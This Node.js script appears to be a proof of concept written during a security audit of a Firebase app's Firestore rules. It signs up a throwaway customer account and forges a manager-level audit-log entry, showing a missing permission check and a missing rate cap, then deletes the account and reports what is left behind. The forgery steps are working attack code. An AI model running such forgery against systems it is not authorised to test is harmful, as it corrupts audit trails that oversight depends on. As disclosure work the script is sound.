#!/usr/bin/env node
/* ─── PROOF OF CONCEPT: audit-log forgery (firestore.rules) ────────────────
 * Finding: the auditLogs create rule binds `actor` and `role` to the caller
 * but never binds `action` to the caller's permissions. Any signed-in
 * customer can write audit entries claiming manager-level actions
 * ("Removed dish", "Hid from menu", "Added branch" …), and the rule imposes
 * no rate cap — an unlimited-writes / cost-abuse vector. public/js/app.js
 * claims audit entries "can't be forged"; the rules only prove who wrote
 * them, not what they may claim.
 *
 * The forgery goes through the real Firestore SDK (serverTimestamp), because
 * the rule requires createdAt == request.time — which a raw REST call can
 * never satisfy. Earlier REST probes also confirmed role escalation is
 * BLOCKED at both the create and update paths (HTTP 403 each).
 *
 * Residue (cannot be deleted through the rules — delete: false):
 *   auditLogs/{id}   the forged entry  → delete in Firebase console → Firestore
 *   users/{uid}      orphan profile of the deleted throwaway account
 * Both ids are printed at the end. The throwaway Auth account itself is
 * deleted by this script.
 *
 *   cd scripts && npm install     # once — provides the firebase SDK
 *   node scripts/security/audit-forge-poc.mjs
 * ───────────────────────────────────────────────────────────────────────── */
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { initializeApp } from 'firebase/app';
import { getAuth, createUserWithEmailAndPassword, deleteUser } from 'firebase/auth';
import { getFirestore, collection, addDoc, doc, setDoc, getDocs, serverTimestamp } from 'firebase/firestore';

const here = dirname(fileURLToPath(import.meta.url));
const source = readFileSync(join(here, '..', '..', 'public', 'js', 'firebase.js'), 'utf8');
const apiKey = /apiKey:\s*'([^']+)'/.exec(source)?.[1];
if (!apiKey) { console.error('Could not read the Firebase web API key from public/js/firebase.js.'); process.exit(1); }

const app = initializeApp({ apiKey, authDomain: 'project-ni-mark.firebaseapp.com', projectId: 'project-ni-mark' });
const auth = getAuth(app);
const db = getFirestore(app);

const email = `bf-audit-${Date.now()}@example.com`;
const password = 'AuditProbe123!'; // throwaway, deleted at the end
const step = (n, label) => console.log(`  ${n}. ${label}`);
const ok = txt => console.log(`     → ${txt}`);
const err = e => `→ ${e.code || e.name || 'ERROR'}: ${(e.message || String(e)).slice(0, 110)}`;

console.log(`Audit-log forgery PoC — project-ni-mark`);
console.log(`throwaway account: ${email}\n`);

let user;
let forgedId = null;

try {
  // 1 ─ attacker account
  step(1, 'create throwaway account (signUp)');
  const cred = await createUserWithEmailAndPassword(auth, email, password);
  user = cred.user;
  ok(`uid = ${user.uid}`);

  // 2 ─ normal customer profile (the site does this on first sign-in) —
  //      needed because the forge rule checks me().role
  step(2, 'create normal profile role=customer');
  await setDoc(doc(db, 'users', user.uid), { role: 'customer', email: user.email, createdAt: serverTimestamp() });
  ok('allowed (as expected)');

  // 3 ─ the forger cannot read the log (manager only) — context, expected denial
  step(3, 'read the audit log as a customer');
  try { await getDocs(collection(db, 'auditLogs')); ok('ALLOWED — unexpected!'); }
  catch (e) { ok(`denied (${e.code}) — as expected`); }

  // 4 ─ THE FORGERY: a customer writes an audit entry claiming a manager action
  step(4, 'FORGE audit entry action="Removed dish" via the Firestore SDK');
  const ref = await addDoc(collection(db, 'auditLogs'), {
    actor: user.email,
    role: 'customer',
    action: 'Removed dish',
    target: 'SECURITY-PROOF — forged by customer (PoC)',
    createdAt: serverTimestamp(),
  });
  forgedId = ref.id;
  ok('ALLOWED — write committed  ← VULNERABILITY');
} catch (e) {
  ok(`denied unexpectedly: ${err(e)}`);
  ok('(the deployed rule may be stricter than firestore.rules — re-check the file)');
} finally {
  if (user) {
    await deleteUser(user).then(() => console.log('\n  throwaway account deleted.')).catch(e => console.log(`\n  account delete failed: ${err(e)}`));
  }
}

console.log('\n── Verdict ─────────────────────────────────────────────────');
if (forgedId) {
  console.log('VULNERABLE — a signed-in customer wrote a "Removed dish" entry');
  console.log('into the manager audit log. The rule never checks that the caller');
  console.log('may perform the action it claims, and imposes no rate cap.');
} else {
  console.log('Forgery attempt did not commit — see output above.');
}
console.log('\nResidue to remove in Firebase console → Firestore:');
if (forgedId) console.log(`  auditLogs/${forgedId}`);
if (user) console.log(`  users/${user.uid}`);
